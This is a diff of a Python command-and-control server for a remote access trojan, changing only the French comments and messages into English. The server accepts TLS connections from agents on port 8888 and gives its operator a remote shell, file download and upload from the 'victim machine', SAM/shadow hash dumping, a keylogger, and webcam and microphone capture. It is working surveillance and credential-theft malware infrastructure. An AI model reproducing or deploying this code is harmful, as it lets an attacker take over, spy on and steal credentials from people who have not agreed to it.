@@ -1,9 +1,9 @@
 """
-Serveur RAT - Remote Administration Tool.
+RAT Server - Remote Administration Tool.
 
-Écoute les connexions entrantes des agents via une socket TCP chiffrée TLS.
-Supporte plusieurs agents en parallèle grâce aux threads.
-Interface interactive en ligne de commande pour piloter les agents.
+Listens for incoming agent connections via a TLS-encrypted TCP socket.
+Supports multiple agents in parallel using threads.
+Interactive command-line interface to control agents.
 """
 
 import base64
@@ -23,28 +23,28 @@ PORT = 8888
 
 logger = setup_logger("server")
 
-# Dictionnaire des sessions actives : {session_id: {conn, ip, port, hostname, os, release}}
+# Active sessions dictionary: {session_id: {conn, ip, port, hostname, os, release}}
 sessions: dict[int, dict[str, Any]] = {}
 session_lock = threading.Lock()
 session_counter = 0
 
 
 # ---------------------------------------------------------------------------
-# Gestion des sessions
+# Session management
 # ---------------------------------------------------------------------------
 
 
 def register_session(conn: socket.socket, addr: tuple[str, int], payload: dict[str, Any]) -> int:
     """
-    Enregistre un nouvel agent dans le dictionnaire des sessions.
+    Registers a new agent in the sessions dictionary.
 
     Args:
-        conn: Socket TLS de l'agent.
-        addr: Tuple (ip, port) de l'agent.
-        payload: Dictionnaire d'enregistrement envoyé par l'agent.
+        conn: Agent TLS socket.
+        addr: Tuple (ip, port) of the agent.
+        payload: Registration dictionary sent by the agent.
 
     Returns:
-        int: Identifiant unique de la session créée.
+        int: Unique identifier of the created session.
     """
     global session_counter
 
@@ -61,7 +61,7 @@ def register_session(conn: socket.socket, addr: tuple[str, int], payload: dict[s
         }
 
     logger.info(
-        "Session %s enregistrée : %s:%s | %s | %s %s",
+        "Session %s registered: %s:%s | %s | %s %s",
         session_id,
         addr[0],
         addr[1],
@@ -74,39 +74,39 @@ def register_session(conn: socket.socket, addr: tuple[str, int], payload: dict[s
 
 def remove_session(session_id: int) -> None:
     """
-    Supprime une session du dictionnaire des sessions actives.
+    Removes a session from the active sessions dictionary.
 
     Args:
-        session_id: Identifiant de la session à supprimer.
+        session_id: Identifier of the session to remove.
     """
     with session_lock:
         if session_id in sessions:
             del sessions[session_id]
-            logger.info("Session %s supprimée", session_id)
+            logger.info("Session %s removed", session_id)
 
 
 def get_session(session_id: int) -> dict[str, Any] | None:
     """
-    Récupère les données d'une session par son identifiant.
+    Retrieves a session's data by its identifier.
 
     Args:
-        session_id: Identifiant de la session.
+        session_id: Session identifier.
 
     Returns:
-        dict ou None si la session n'existe pas.
+        dict or None if the session does not exist.
     """
     with session_lock:
         return sessions.get(session_id)
 
 
 def print_sessions() -> None:
-    """Affiche la liste des sessions actives dans la console."""
+    """Prints the list of active sessions to the console."""
     with session_lock:
         if not sessions:
-            print("[*] Aucun agent connecté.")
+            print("[*] No agent connected.")
             return
 
-        print("[*] Sessions actives :")
+        print("[*] Active sessions:")
         for sid, data in sessions.items():
             print(
                 f"    Agent {sid} | {data['ip']}:{data['port']} "
@@ -115,91 +115,91 @@ def print_sessions() -> None:
 
 
 # ---------------------------------------------------------------------------
-# Gestion des connexions entrantes
+# Incoming connection handling
 # ---------------------------------------------------------------------------
 
 
 def handle_client(conn: socket.socket, addr: tuple[str, int]) -> None:
     """
-    Gère la connexion d'un agent depuis un thread dédié.
+    Handles an agent connection from a dedicated thread.
 
-    Attend le message d'enregistrement, crée la session,
-    puis garde la connexion ouverte jusqu'à déconnexion.
+    Waits for the registration message, creates the session,
+    then keeps the connection open until disconnection.
 
     Args:
-        conn: Socket TLS de l'agent.
-        addr: Tuple (ip, port) de l'agent.
+        conn: Agent TLS socket.
+        addr: Tuple (ip, port) of the agent.
     """
     session_id = None
 
     try:
-        logger.info("Connexion entrante de %s:%s", addr[0], addr[1])
+        logger.info("Incoming connection from %s:%s", addr[0], addr[1])
 
-        # Premier message : enregistrement obligatoire
+        # First message: registration required
         data = conn.recv(4096)
         if not data:
-            logger.warning("Données vides reçues de %s:%s", addr[0], addr[1])
+            logger.warning("Empty data received from %s:%s", addr[0], addr[1])
             return
 
         payload = decode_message(data.decode("utf-8").strip())
 
         if payload.get("type") != "register":
-            logger.warning("Premier message invalide de %s:%s : %s", addr[0], addr[1], payload)
+            logger.warning("Invalid first message from %s:%s: %s", addr[0], addr[1], payload)
             conn.sendall(
-                encode_message({"type": "error", "message": "Le premier message doit être 'register'"})
+                encode_message({"type": "error", "message": "First message must be 'register'"})
             )
             return
 
         session_id = register_session(conn, addr, payload)
-        print(f"\n[+] Agent {session_id} connecté ({addr[0]} | {payload.get('hostname', '?')})")
+        print(f"\n[+] Agent {session_id} connected ({addr[0]} | {payload.get('hostname', '?')})")
         print("rat > ", end="", flush=True)
 
-        # Accusé de réception à l'agent
+        # Send acknowledgement to the agent
         conn.sendall(
             encode_message(
                 {
                     "type": "ack",
-                    "message": f"session {session_id} enregistrée",
+                    "message": f"session {session_id} registered",
                     "session_id": session_id,
                 }
             )
         )
 
-        # Maintenir la connexion ouverte (les commandes sont envoyées depuis interact_with_session)
+        # Keep connection open (commands are sent from interact_with_session)
         while get_session(session_id) is not None:
             time.sleep(0.2)
 
     except Exception as exc:
-        logger.exception("Erreur avec l'agent %s:%s : %s", addr[0], addr[1], exc)
+        logger.exception("Error with agent %s:%s: %s", addr[0], addr[1], exc)
 
     finally:
         if session_id is not None:
             remove_session(session_id)
-            print(f"\n[-] Agent {session_id} déconnecté")
+            print(f"\n[-] Agent {session_id} disconnected")
             print("rat > ", end="", flush=True)
         conn.close()
-        logger.info("Connexion fermée pour %s:%s", addr[0], addr[1])
+        logger.info("Connection closed for %s:%s", addr[0], addr[1])
 
 
 def accept_clients(server_socket: socket.socket) -> None:
     """
-    Boucle d'acceptation des connexions entrantes (tourne dans un thread daemon).
+    Accepts incoming connections in a loop (runs in a daemon thread).
 
-    Chaque nouvel agent est géré dans un thread séparé.
+    Each new agent is handled in a separate thread.
 
     Args:
-        server_socket: Socket serveur TLS en écoute.
+        server_socket: Listening TLS server socket.
     """
     while True:
         try:
             conn, addr = server_socket.accept()
-            logger.info("Nouvelle connexion TLS acceptée de %s:%s", addr[0], addr[1])
+            logger.info("New TLS connection accepted from %s:%s", addr[0], addr[1])
 
             thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
             thread.start()
 
         except Exception as exc:
-            logger.exception("Erreur lors de l'acceptation d'une connexion : %s", exc)
+            logger.exception("Error accepting connection: %s", exc)
 
 
 # ---------------------------------------------------------------------------
@@ -226,21 +226,21 @@ def send_command_and_recv(conn: socket.socket, command: str, extra: dict | None 
 
 def interact_with_session(session_id: int) -> None:
     """
-    Ouvre une session interactive avec un agent.
+    Opens an interactive session with an agent.
 
-    Permet d'envoyer des commandes et de recevoir les résultats.
-    Tape 'back' pour revenir au menu principal.
+    Allows sending commands and receiving results.
+    Type 'back' to return to the main menu.
 
     Args:
-        session_id: Identifiant de la session cible.
+        session_id: Target session identifier.
     """
     session = get_session(session_id)
 
     if session is None:
-        print(f"[!] Session {session_id} introuvable.")
+        print(f"[!] Session {session_id} not found.")
         return
 
-    logger.info("Interaction ouverte avec la session %s", session_id)
+    logger.info("Interaction opened with session %s", session_id)
     conn = session["conn"]
 
     while True:
@@ -251,27 +251,27 @@ def interact_with_session(session_id: int) -> None:
                 continue
 
             if command == "back":
-                logger.info("Retour au menu principal depuis la session %s", session_id)
+                logger.info("Returning to main menu from session %s", session_id)
                 break
 
             if command == "help":
-                print("Commandes disponibles pour l'agent :")
-                print("  sysinfo           - Informations système")
-                print("  ipconfig          - Configuration réseau")
-                print("  screenshot        - Capture d'écran")
-                print("  shell             - Shell interactif (bash/cmd)")
-                print("  search <nom>      - Rechercher un fichier")
-                print("  download <path>   - Télécharger un fichier depuis l'agent")
-                print("  upload <path>     - Envoyer un fichier vers l'agent")
-                print("  hashdump          - Dump SAM (Windows) ou shadow (Linux)")
-                print("  keylogger         - Démarrer/arrêter le keylogger")
-                print("  webcam_snapshot   - Photo webcam")
-                print("  webcam_stream     - Flux webcam (Ctrl+C pour stopper)")
-                print("  record_audio      - Enregistrement audio (5 secondes)")
-                print("  back              - Retour au menu principal")
+                print("Available commands for the agent:")
+                print("  sysinfo           - System information")
+                print("  ipconfig          - Network configuration")
+                print("  screenshot        - Take a screenshot")
+                print("  shell             - Interactive shell (bash/cmd)")
+                print("  search <name>     - Search for a file")
+                print("  download <path>   - Download a file from the agent")
+                print("  upload <path>     - Upload a file to the agent")
+                print("  hashdump          - Dump SAM (Windows) or shadow (Linux)")
+                print("  keylogger         - Start/stop the keylogger")
+                print("  webcam_snapshot   - Webcam photo")
+                print("  webcam_stream     - Live webcam stream (Ctrl+C to stop)")
+                print("  record_audio      - Audio recording (5 seconds)")
+                print("  back              - Return to main menu")
                 continue
 
-            # --- Commandes simples (pas de paramètre) ---
+            # --- Simple commands (no parameter) ---
             if command in (
                 "sysinfo",
                 "ipconfig",
@@ -283,7 +283,7 @@ def interact_with_session(session_id: int) -> None:
                 response = send_command_and_recv(conn, command)
                 _print_response(response)
 
-            # --- record_audio [durée optionnelle] ---
+            # --- record_audio [optional duration] ---
             elif command.startswith("record_audio"):
                 parts = command.split(maxsplit=1)
                 duration = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 5
@@ -294,40 +294,40 @@ def interact_with_session(session_id: int) -> None:
             elif command == "webcam_stream":
                 _webcam_stream_session(conn, session_id)
 
-            # --- Shell interactif ---
+            # --- Interactive shell ---
             elif command == "shell":
                 _shell_session(conn, session_id)
 
-            # --- Recherche fichier ---
+            # --- File search ---
             elif command.startswith("search "):
                 filename = command.split(maxsplit=1)[1]
                 response = send_command_and_recv(conn, "search", {"filename": filename})
                 _print_response(response)
 
-            # --- Download (agent → serveur) ---
+            # --- Download (agent → server) ---
             elif command.startswith("download "):
                 remote_path = command.split(maxsplit=1)[1]
                 _download_file(conn, remote_path)
 
-            # --- Upload (serveur → agent) ---
+            # --- Upload (server → agent) ---
             elif command.startswith("upload "):
                 local_path = command.split(maxsplit=1)[1]
                 _upload_file(conn, local_path, session_id)
 
             else:
-                logger.warning("Commande agent inconnue : %s", command)
-                print("[!] Commande inconnue. Tape 'help'.")
+                logger.warning("Unknown agent command: %s", command)
+                print("[!] Unknown command. Type 'help'.")
 
         except KeyboardInterrupt:
             print()
             break
         except BrokenPipeError:
-            print(f"\n[-] Agent {session_id} déconnecté.")
+            print(f"\n[-] Agent {session_id} disconnected.")
             remove_session(session_id)
             break
         except Exception as exc:
-            logger.exception("Erreur lors de l'interaction avec la session %s : %s", session_id, exc)
-            print(f"[!] Erreur : {exc}")
+            logger.exception("Error during interaction with session %s: %s", session_id, exc)
+            print(f"[!] Error: {exc}")
             break
 
 
@@ -353,16 +353,16 @@ def _print_response(response: dict[str, Any]) -> None:
 
 def _shell_session(conn: socket.socket, session_id: int) -> None:
     """
-    Lance un shell interactif avec l'agent.
+    Starts an interactive shell with the agent.
 
-    Envoie les commandes une par une et affiche le résultat.
-    Tape 'exit' pour quitter le shell.
+    Sends commands one by one and displays the result.
+    Type 'exit' to quit the shell.
 
     Args:
-        conn: Socket TLS de l'agent.
-        session_id: Identifiant de la session (pour les logs).
+        conn: Agent TLS socket.
+        session_id: Session identifier (for logs).
     """
-    print("[*] Shell interactif ouvert. Tape 'exit' pour quitter.")
+    print("[*] Interactive shell opened. Type 'exit' to quit.")
     conn.sendall(encode_message({"type": "command", "command": "shell_start"}))
 
     while True:
@@ -441,11 +441,11 @@ def _webcam_stream_session(conn: socket.socket, session_id: int) -> None:
 
 def _download_file(conn: socket.socket, remote_path: str) -> None:
     """
-    Télécharge un fichier depuis l'agent vers le serveur.
+    Downloads a file from the agent to the server.
 
     Args:
-        conn: Socket TLS de l'agent.
-        remote_path: Chemin du fichier sur la machine victime.
+        conn: Agent TLS socket.
+        remote_path: Path of the file on the victim machine.
     """
     conn.sendall(encode_message({"type": "command", "command": "download", "path": remote_path}))
     data = conn.recv(10 * 1024 * 1024)  # 10 MB max
@@ -460,22 +460,22 @@ def _download_file(conn: socket.socket, remote_path: str) -> None:
     save_path = Path("downloads") / filename
     save_path.parent.mkdir(exist_ok=True)
     save_path.write_bytes(file_data)
-    print(f"[+] Fichier sauvegardé : {save_path} ({len(file_data)} octets)")
-    logger.info("Fichier téléchargé : %s → %s", remote_path, save_path)
+    print(f"[+] File saved: {save_path} ({len(file_data)} bytes)")
+    logger.info("File downloaded: %s → %s", remote_path, save_path)
 
 
 def _upload_file(conn: socket.socket, local_path: str, session_id: int) -> None:
     """
-    Envoie un fichier local vers l'agent.
+    Sends a local file to the agent.
 
     Args:
-        conn: Socket TLS de l'agent.
-        local_path: Chemin local du fichier à envoyer.
-        session_id: Identifiant de la session (pour les logs).
+        conn: Agent TLS socket.
+        local_path: Local path of the file to send.
+        session_id: Session identifier (for logs).
     """
     path = Path(local_path)
     if not path.exists():
-        print(f"[!] Fichier introuvable : {local_path}")
+        print(f"[!] File not found: {local_path}")
         return
 
     file_data = base64.b64encode(path.read_bytes()).decode("utf-8")
@@ -492,8 +492,8 @@ def _upload_file(conn: socket.socket, local_path: str, session_id: int) -> None:
 
     data = conn.recv(4096)
     response = decode_message(data.decode("utf-8").strip())
-    print(response.get("output", "[?] Réponse inattendue"))
-    logger.info("Fichier uploadé vers session %s : %s", session_id, local_path)
+    print(response.get("output", "[?] Unexpected response"))
+    logger.info("File uploaded to session %s: %s", session_id, local_path)
 
 
 def _save_audio(response: dict[str, Any]) -> None:
@@ -527,15 +527,15 @@ def _save_audio(response: dict[str, Any]) -> None:
 
 
 # ---------------------------------------------------------------------------
-# Boucle principale du serveur
+# Main server loop
 # ---------------------------------------------------------------------------
 
 
 def command_loop() -> None:
     """
-    Boucle de commandes interactive du serveur.
+    Interactive command loop of the server.
 
-    Commandes disponibles : help, sessions, interact <id>, exit.
+    Available commands: help, sessions, interact <id>, exit.
     """
     while True:
         try:
@@ -545,11 +545,11 @@ def command_loop() -> None:
                 continue
 
             if command == "help":
-                print("Commandes disponibles :")
-                print("  help              - Affiche ce menu")
-                print("  sessions          - Liste les agents connectés")
-                print("  interact <id>     - Interagit avec un agent")
-                print("  exit              - Arrête le serveur")
+                print("Available commands:")
+                print("  help              - Show this menu")
+                print("  sessions          - List connected agents")
+                print("  interact <id>     - Interact with an agent")
+                print("  exit              - Stop the server")
 
             elif command == "sessions":
                 print_sessions()
@@ -557,35 +557,35 @@ def command_loop() -> None:
             elif command.startswith("interact "):
                 _, session_id_str = command.split(maxsplit=1)
                 if not session_id_str.isdigit():
-                    logger.warning("ID de session invalide : %s", session_id_str)
-                    print("[!] L'identifiant de session doit être un nombre.")
+                    logger.warning("Invalid session ID: %s", session_id_str)
+                    print("[!] Session ID must be a number.")
                     continue
                 interact_with_session(int(session_id_str))
 
             elif command == "exit":
-                logger.info("Arrêt du serveur.")
-                print("[*] Arrêt du serveur...")
+                logger.info("Server shutting down.")
+                print("[*] Shutting down server...")
                 break
 
             else:
-                logger.warning("Commande serveur inconnue : %s", command)
-                print("[!] Commande inconnue. Tape 'help'.")
+                logger.warning("Unknown server command: %s", command)
+                print("[!] Unknown command. Type 'help'.")
 
         except KeyboardInterrupt:
-            logger.info("Serveur interrompu par l'utilisateur.")
-            print("\n[*] Arrêt du serveur...")
+            logger.info("Server interrupted by user.")
+            print("\n[*] Shutting down server...")
             break
         except Exception as exc:
-            logger.exception("Erreur dans la boucle de commandes : %s", exc)
-            print(f"[!] Erreur inattendue : {exc}")
+            logger.exception("Error in command loop: %s", exc)
+            print(f"[!] Unexpected error: {exc}")
 
 
 def run_server() -> None:
     """
-    Point d'entrée du serveur RAT.
+    RAT server entry point.
 
-    Crée la socket TCP, applique le contexte TLS,
-    lance le thread d'acceptation et démarre la boucle interactive.
+    Creates the TCP socket, applies the TLS context,
+    starts the accept thread and launches the interactive loop.
     """
     ssl_context = create_server_ssl_context()
 
@@ -595,9 +595,9 @@ def run_server() -> None:
             raw_socket.bind((HOST, PORT))
             raw_socket.listen(5)
 
-            # Encapsulation TLS de la socket serveur
+            # Wrap the server socket with TLS
             with ssl_context.wrap_socket(raw_socket, server_side=True) as server_socket:
-                logger.info("Serveur en écoute sur %s:%s (TLS activé)", HOST, PORT)
+                logger.info("Server listening on %s:%s (TLS enabled)", HOST, PORT)
                 print(f"[*] Listening on {PORT}... (TLS)")
 
                 accept_thread = threading.Thread(target=accept_clients, args=(server_socket,), daemon=True)
@@ -606,7 +606,7 @@ def run_server() -> None:
                 command_loop()
 
     except Exception as exc:
-        logger.exception("Erreur fatale du serveur : %s", exc)
+        logger.exception("Fatal server error: %s", exc)
 
 
 if __name__ == "__main__":
